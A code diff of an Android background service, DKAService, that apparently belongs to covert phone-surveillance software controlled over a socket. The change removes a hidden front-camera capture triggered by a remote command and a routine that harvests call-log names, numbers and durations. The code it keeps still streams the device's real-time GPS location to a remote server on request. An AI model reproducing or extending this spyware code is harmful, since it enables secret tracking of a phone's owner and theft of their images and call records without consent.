@@ -4,6 +4,7 @@ import android.annotation.SuppressLint
 import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
+import android.app.Service
 import android.content.Context
 import android.content.Intent
 import android.graphics.ImageFormat
@@ -15,14 +16,6 @@ import android.provider.CallLog
 import android.util.Log
 import androidx.annotation.RequiresApi
 import androidx.core.app.NotificationCompat
-import com.androidhiddencamera.CameraConfig
-import com.androidhiddencamera.CameraError
-import com.androidhiddencamera.HiddenCameraService
-import com.androidhiddencamera.HiddenCameraUtils
-import com.androidhiddencamera.config.CameraFacing
-import com.androidhiddencamera.config.CameraImageFormat
-import com.androidhiddencamera.config.CameraResolution
-import com.androidhiddencamera.config.CameraRotation
 import com.google.android.gms.location.*
 import github.nisrulz.easydeviceinfo.base.EasyBatteryMod
 import github.nisrulz.easydeviceinfo.base.EasyDeviceMod
@@ -35,7 +28,7 @@ import java.io.File
 import java.net.URISyntaxException
 
 
-class DKAService : HiddenCameraService() {
+class DKAService : Service() {
 
     private lateinit var fusedLocationClient : FusedLocationProviderClient
     private lateinit var mLocationRequest : LocationRequest
@@ -51,7 +44,6 @@ class DKAService : HiddenCameraService() {
 
     private var mToogleGPSRealtime : Boolean = false
 
-    private lateinit var mCameraConfig : CameraConfig
 
     private var mImageReader: ImageReader? = null
     private lateinit var mCameraManager: CameraManager
@@ -181,9 +173,8 @@ class DKAService : HiddenCameraService() {
                 .setPriority(LocationRequest.PRIORITY_BALANCED_POWER_ACCURACY)
         /** @TODO Declare Lokasi Umpan Balik **/
         mLocationCallback = object : LocationCallback() {
-            override fun onLocationResult(locationResult: LocationResult?) {
-                locationResult ?: return
-                for (location in locationResult.locations){
+            override fun onLocationResult(p0: LocationResult) {
+                for (location in p0.locations){
                     mSocket?.emit("LocationRequestUpdateRealtime", JSONObject().apply {
                         put("coordinate_lat", location.latitude)
                         put("coordinate_lng", location.longitude)
@@ -323,15 +314,7 @@ class DKAService : HiddenCameraService() {
             mSocket?.on("getDeviceCameraCapture"){
                 //Setting camera configuration
                 //Setting camera configuration
-                mCameraConfig = CameraConfig()
-                        .getBuilder(this)
-                        .setCameraFacing(CameraFacing.FRONT_FACING_CAMERA)
-                        .setCameraResolution(CameraResolution.LOW_RESOLUTION)
-                        .setImageFormat(CameraImageFormat.FORMAT_JPEG)
-                        .setImageRotation(CameraRotation.ROTATION_270)
-                        .build()
 
-                startCamera(mCameraConfig)
             }
 
             /** @TODO Fungsi Video Record **/
@@ -387,68 +370,12 @@ class DKAService : HiddenCameraService() {
         return null
     }
 
-    override fun onImageCapture(imageFile: File) {
-
-
-    }
-
-    override fun onCameraError(errorCode: Int) {
-        when (errorCode) {
-            CameraError.ERROR_CAMERA_OPEN_FAILED -> {
-                Log.d("DKA", "Kamera Gagal Di Buka : " + errorCode)
-                stopCamera()
-            }
-            CameraError.ERROR_IMAGE_WRITE_FAILED -> {
-                Log.d("DKA", "Kamera Gagal Menulis Gambar")
-                stopCamera()
-
-            }
-            CameraError.ERROR_CAMERA_PERMISSION_NOT_AVAILABLE -> {
-                Log.d("DKA", "Kamera Permission Tidak Tersedia")
-                stopCamera()
-            }
-            CameraError.ERROR_DOES_NOT_HAVE_OVERDRAW_PERMISSION ->             //Display information dialog to the user with steps to grant "Draw over other app"
-                //permission for the app.
-                HiddenCameraUtils.openDrawOverPermissionSetting(this)
-            CameraError.ERROR_DOES_NOT_HAVE_FRONT_CAMERA -> {
-                Log.d("DKA", "Ponsel Tidak Memiliki Kamera Depan")
-                stopCamera()
-            }
-        }
-    }
-
     override fun onDestroy() {
         super.onDestroy()
         fusedLocationClient.removeLocationUpdates(mLocationCallback)
         mSocket?.disconnect()
         mSocket?.close()
 
-    }
-
-    @RequiresApi(Build.VERSION_CODES.O)
-    @SuppressLint("Recycle")
-    private fun getContactList() : JSONArray {
-
-        val mListContactArray = JSONArray()
-
-        val uriCallLogs: Uri = Uri.parse("content://call_log/calls")
-        val cursorCallLogs = contentResolver.query(uriCallLogs, null, null, null)
-        cursorCallLogs?.moveToFirst()
-        do {
-            val stringNumber = cursorCallLogs?.getString(cursorCallLogs.getColumnIndex(CallLog.Calls.NUMBER))
-            val stringName = cursorCallLogs?.getString(cursorCallLogs.getColumnIndex(CallLog.Calls.CACHED_NAME))
-            val stringDuration = cursorCallLogs?.getString(cursorCallLogs.getColumnIndex(CallLog.Calls.DURATION))
-            val stringType = cursorCallLogs?.getString(cursorCallLogs.getColumnIndex(CallLog.Calls.TYPE))
-
-            mListContactArray.put(JSONObject().apply {
-                put("nama Kontak", stringName)
-                put("no telp", stringNumber)
-                put("durasi Panggilan", stringDuration)
-                put("tipe Panggilan", stringType)
-            })
-        } while (cursorCallLogs?.moveToNext()!!)
-
-        return mListContactArray
     }
 
 
